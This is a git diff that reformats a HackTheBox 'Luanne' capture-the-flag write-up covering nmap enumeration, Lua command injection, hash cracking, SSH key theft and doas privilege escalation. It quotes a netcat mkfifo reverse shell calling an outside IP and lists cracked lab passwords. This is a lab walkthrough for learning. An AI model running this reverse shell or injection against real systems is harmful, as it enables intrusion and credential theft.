@@ -2,15 +2,15 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/575da6d958ebf232057c77d5bc8e191cb030ec4f/linux-machines/easy/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
 ## Useful Skills and Tools
 
-### decrypt `.enc` file in BSD (also look up how to in normal linux openssl enc)
+### decrypt `.enc` file in BSD \(also look up how to in normal linux openssl enc\)
 
-- description with generic example
+* description with generic example
 
 ### `sudo` in BSD
 
@@ -19,16 +19,15 @@ doas whoami
 #root
 ```
 
-### location of password hashes in bsd 
+### location of password hashes in bsd
 
 `/etc/master.passwd`
-
 
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.218`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output (.nmap,.gnmap, and .xml) with filenames of `<name>`.
+I started my enumeration with an nmap scan of `10.10.10.218`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.
 
 ```bash
 ┌──(zweilos㉿kali)-[~/htb/luanne]
@@ -66,20 +65,19 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 1066.53 seconds
 ```
 
-
 ports 22- SSH, 80 - HTTP open, 9001 - says `Medusa httpd 1.12 (Supervisor process manager)`
 
 ### port 80 - HTTP
 
-Basic authorization prompt, no creds.  robots.txt shows `Disallow: /weather  #returning 404 but still harvesting cities`
+Basic authorization prompt, no creds. robots.txt shows `Disallow: /weather #returning 404 but still harvesting cities`
 
 ### port 9001 - HTTP
 
-googled Supervisor process manager default credentials after seeing "default" 
+googled Supervisor process manager default credentials after seeing "default"
 
-* https://readthedocs.org/projects/supervisor/downloads/pdf/latest/
+* [https://readthedocs.org/projects/supervisor/downloads/pdf/latest/](https://readthedocs.org/projects/supervisor/downloads/pdf/latest/)
 
-default seemed to be user:123 from the manual (though it specifies none:none)
+default seemed to be user:123 from the manual \(though it specifies none:none\)
 
 after logging in I had a supervisor-status page that showed what appeared to be running processes on the server
 
@@ -105,8 +103,7 @@ _httpd     20969  0.0  0.0  35460  2296 ?     I     9:02PM 0:00.00 /usr/libexec/
 _httpd     26236  0.0  0.0  35460  2296 ?     I     8:54PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
 root         413  0.0  0.0  19780  1584 ttyE1 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE1 
 root         389  0.0  0.0  23792  1584 ttyE2 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE2 
-root         433  0.0  0.0  19784  1584 ttyE3 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE3 
-
+root         433  0.0  0.0  19784  1584 ttyE3 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE3
 ```
 
 I saw a cron in the process output, as well as a weather.lua
@@ -115,9 +112,9 @@ I saw a cron in the process output, as well as a weather.lua
 
 "No city specified. Use 'city=list' to list available cities."
 
-* https://www.lua.org/manual/5.1/manual.html
+* [https://www.lua.org/manual/5.1/manual.html](https://www.lua.org/manual/5.1/manual.html)
 
-ending the query in `'` resulted in "nil" lua error.  had to close off the function parameters with `)`
+ending the query in `'` resulted in "nil" lua error. had to close off the function parameters with `)`
 
 using lua comment `--` at the end closed off the insertion and enabled command execution
 
@@ -154,11 +151,11 @@ dbus:*:1002:1001:System message bus:/var/run/dbus:/sbin/nologin
 
 Got `/etc/passwd`
 
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd
+[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md\#netcat-openbsd](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd)
 
 > `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f`
 
-reverse shell with nc (without -e) for openbsd
+reverse shell with nc \(without -e\) for openbsd
 
 ## Initial Foothold
 
@@ -181,14 +178,14 @@ worked!
 
 ### Enumeration as `_httpd`
 
-```
+```text
 $ which python3
 which: PATH environment variable is not set
 ```
 
-Checked to see if python3 was installed, but got an error that the PATH was not set.  After some testing I found that my usual TTY upgrades were not working.
+Checked to see if python3 was installed, but got an error that the PATH was not set. After some testing I found that my usual TTY upgrades were not working.
 
-```
+```text
 $ pwd
 /var/www
 $ ls -la
@@ -204,7 +201,7 @@ webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
 
 found an MD5 hash in `.htpasswd`
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/luanne]
 └─$ hashcat -O -D1,2 -a0 -m500 hash /usr/share/wordlists/rockyou.txt --username
 hashcat (v6.1.1) starting...
@@ -237,7 +234,7 @@ Dictionary cache hit:
 * Keyspace..: 14344385
 
 $1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest    
-                                                 
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
@@ -260,10 +257,9 @@ Stopped: Sat Mar 27 20:11:48 2021
 
 It cracked within seconds to reveal the password `iamthebest`.
 
-
 ## Road to User
 
-```
+```text
 $ ps -auxw
 USER         PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
 nginx         79  2.5  0.1  33696  3308 ?     S    10:22AM 2:20.96 nginx: worker process 
@@ -299,9 +295,9 @@ root         433  0.0  0.0  19784  1584 ttyE3 Is+  10:22AM 0:00.00 /usr/libexec/
 
 There was a process run by the `r.michaels` user that seemed to be running another instance of the weather.lua, on port 3001.
 
-Note: from others users attempts from the process output I saw one that said `python3.7 -c import pty;pty.spawn("/bin/sh")`.  You may be able to use this to upgrade your shell.  I didn't notice this until after I was done, and it would have been metagaming anyways!
+Note: from others users attempts from the process output I saw one that said `python3.7 -c import pty;pty.spawn("/bin/sh")`. You may be able to use this to upgrade your shell. I didn't notice this until after I was done, and it would have been metagaming anyways!
 
-```
+```text
 $ curl http://localhost:3001
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -315,7 +311,7 @@ $ curl http://localhost:3001
 
 I tried using curl to get the local page at 3001 and got a "No Authorization" error.
 
-```
+```text
 $ curl -u webapi_user:iamthebest http://localhost:3001
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -336,9 +332,9 @@ $ curl -u webapi_user:iamthebest http://localhost:3001
 </html>
 ```
 
-since this 
+since this
 
-```
+```text
 $ find / -user r.michaels 2>/dev/null
 /proc/378
 /proc/378/fd
@@ -364,7 +360,7 @@ $ find / -user r.michaels 2>/dev/null
 
 I tried finding everything that `r.michaels` had access to, but there wasn't much
 
-```
+```text
 $ ls -la /home/r.michaels
 ls: r.michaels: Permission denied
 $ ls -la /var/mail/r.michaels
@@ -375,7 +371,7 @@ I tried to see what was in those directories, but couldn't see anything I could 
 
 since curl
 
-```
+```text
 $ curl -u webapi_user:iamthebest http://localhost:3001/~
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -398,17 +394,16 @@ $ curl -u webapi_user:iamthebest http://localhost:3001/~/
 
 searched for how to access home directory in a URL and found
 
-* https://apple.stackexchange.com/questions/100570/getting-all-files-from-a-web-page-using-curl
+* [https://apple.stackexchange.com/questions/100570/getting-all-files-from-a-web-page-using-curl](https://apple.stackexchange.com/questions/100570/getting-all-files-from-a-web-page-using-curl)
+* [https://stackoverflow.com/questions/3488603/how-do-i-use-tilde-in-the-context-of-paths](https://stackoverflow.com/questions/3488603/how-do-i-use-tilde-in-the-context-of-paths)
 
-* https://stackoverflow.com/questions/3488603/how-do-i-use-tilde-in-the-context-of-paths
+> Used in URLs, interpretation of the tilde as a shorthand for a user's home directory \(e.g., [http://www.foo.org/~bob](http://www.foo.org/~bob)\) is a convention borrowed from Unix. Implementation is entirely server-specific, so you'd need to check the documentation for your web server to see if it has any special meaning.
 
-> Used in URLs, interpretation of the tilde as a shorthand for a user's home directory (e.g., http://www.foo.org/~bob) is a convention borrowed from Unix. Implementation is entirely server-specific, so you'd need to check the documentation for your web server to see if it has any special meaning.
-
-* https://websiteforstudents.com/configure-nginx-userdir-feature-on-ubuntu-16-04-lts-servers/
+* [https://websiteforstudents.com/configure-nginx-userdir-feature-on-ubuntu-16-04-lts-servers/](https://websiteforstudents.com/configure-nginx-userdir-feature-on-ubuntu-16-04-lts-servers/)
 
 it seems like the tilde thing is also used specifically in nginx
 
-```
+```text
 $ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -417,12 +412,11 @@ $ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels
 <body><h1>Document Moved</h1>
 This document had moved <a href="http://localhost:3001/~r.michaels/">here</a>
 </body></html>
-
 ```
 
 The post was related to python, but it seemed to work, at least somewhat
 
-```
+```text
 $ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels/
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -451,9 +445,9 @@ tr:nth-child(even) { background: lavender; }
 
 Putting the trailing slash on the url caused it to give me a directory listing
 
-id_rsa sounded quite interesting
+id\_rsa sounded quite interesting
 
-```
+```text
 $ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels/id_rsa
 sh: 48: Syntax error: redirection unexpected
 $ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels/id_rsa/
@@ -467,9 +461,9 @@ $ curl -u webapi_user:iamthebest http://localhost:3001/~r.michaels/id_rsa/
 </body></html>
 ```
 
-However, trying to retrieve the `id_rsa` file gave some errors. 
+However, trying to retrieve the `id_rsa` file gave some errors.
 
-```
+```text
 $ curl -u webapi_user:iamthebest ftp://localhost:3001/~r.michaels/id_rsa
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -483,7 +477,7 @@ Next I tried switching protocols to use ftp:// rather than http:// but that fail
 
 ### Finding user creds
 
-```
+```text
 $ curl -u webapi_user:iamthebest localhost:3001/~r.michaels/id_rsa
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -532,7 +526,7 @@ I was finally able to get it by removing the specification for curl to interpret
 
 ### User.txt
 
-```
+```text
 zweilos@kali:~/htb/luanne$ chmod 600 r.michaels.key 
 zweilos@kali:~/htb/luanne$ ssh -i r.michaels.key r.michaels@10.10.10.218
 Last login: Sat Mar 27 21:16:20 2021 from 10.10.14.220
@@ -564,21 +558,18 @@ ea5f0ce6a917b0be1eabc7f9218febc0
 
 got the user.txt flag
 
-
 ## Path to Power \(Gaining Administrator Access\)
 
 ### Enumeration as User `r.michaels`
 
-
-
-```
+```text
 luanne$ groups r.michaels
 users
 ```
 
 `r.michaels` was only a member of the users group
 
-```
+```text
 luanne$ cd backups/                                                                                   
 luanne$ ls -la
 total 12
@@ -587,25 +578,24 @@ dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 ..
 -r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc
 ```
 
-In the `/backups` folder there was an encrypted tar file.  searching for netbsd tar.gz.enc led to 
+In the `/backups` folder there was an encrypted tar file. searching for netbsd tar.gz.enc led to
 
-https://man.netbsd.org/netpgp.1
+[https://man.netbsd.org/netpgp.1](https://man.netbsd.org/netpgp.1)
 
-```
+```text
 luanne$ netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc | tar xz -C test           
 signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
 Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
 uid              RSA 2048-bit key <r.michaels@localhost>
 tar: Error opening archive: Failed to open '/dev/nrst0'
-
 ```
 
 looks like 2048 bit rsa key
 
-* https://man.netbsd.org/tar.1
-* https://netbsd-users.netbsd.narkive.com/ZatFbpGV/tar-how-does-it-work
+* [https://man.netbsd.org/tar.1](https://man.netbsd.org/tar.1)
+* [https://netbsd-users.netbsd.narkive.com/ZatFbpGV/tar-how-does-it-work](https://netbsd-users.netbsd.narkive.com/ZatFbpGV/tar-how-does-it-work)
 
-```
+```text
 netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc | tar -xzf - -C /tmp/     
 signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
 Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
@@ -614,7 +604,7 @@ uid              RSA 2048-bit key <r.michaels@localhost>
 
 success
 
-```
+```text
 luanne$ ls -ls /tmp
 total 8
 8 drwxr-x---  4 r.michaels  wheel  96 Sep 16  2020 devel-2020-09-16
@@ -629,7 +619,7 @@ drwxr-xr-x  2 r.michaels  wheel  96 Sep 16  2020 www
 
 I was able to successfuly extract the files, but right after I started to look through them the /tmp directory was cleaned up
 
-```
+```text
 luanne$ ls -la
 total 20
 drwxrwxrwt   3 root        wheel   48 Mar 28 04:04 .
@@ -655,7 +645,7 @@ webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
 
 this has was different from the one I had cracked earlier
 
-```
+```text
 luanne$ cat index.html                                                                                
 <!doctype html>
 <html>
@@ -675,7 +665,7 @@ luanne$ cat index.html
 
 This was the same as the `/forecast` site I had seen earlier
 
-```
+```text
 luanne$ cd ../webapi/                                                                                 
 luanne$ ls -la
 total 32
@@ -739,9 +729,9 @@ function forecast(env, headers, query)
             load(json)()
         else
             -- just some fake weather data
-            
+
             ...snipped...
-            
+
         end 
     else
         httpd.write("HTTP/1.1 200 Ok\r\n")
@@ -753,13 +743,12 @@ end
 httpd.register_handler('forecast', forecast)
 ```
 
-Nothing useful here?  There did seem to be a backdoor potentially written in, though it was commented out `-- city=London') os.execute('id') --`.  I think this is where I injected my original access 
+Nothing useful here? There did seem to be a backdoor potentially written in, though it was commented out `-- city=London') os.execute('id') --`. I think this is where I injected my original access
 
-
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/luanne]
 └─$ echo 'webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.' >> hash                                130 ⨯
-                                                                                                       
+
 ┌──(zweilos㉿kali)-[~/htb/luanne]
 └─$ hashcat -O -D1,2 -a0 -m500 hash /usr/share/wordlists/rockyou.txt --username
 hashcat (v6.1.1) starting...
@@ -786,7 +775,7 @@ Dictionary cache hit:
 * Keyspace..: 14344385
 
 $1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.:littlebear    
-                                                 
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
@@ -809,17 +798,17 @@ Stopped: Sat Mar 27 23:58:54 2021
 
 The hash cracked almost immediately, finding a password of `littlebear`
 
-```
+```text
 luanne$ doas whoami
 Password:
 root
 ```
 
-I was able to run commands with `doas` with this password! 
+I was able to run commands with `doas` with this password!
 
 ### Root.txt
 
-```
+```text
 # cd /root
 # ls -la
 total 36
@@ -849,3 +838,4 @@ Note: `/etc/master.passwd` is where password hashes are stored in BSD, not /etc/
 Thanks to [`polarbearer`](https://app.hackthebox.eu/users/159204) for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
+
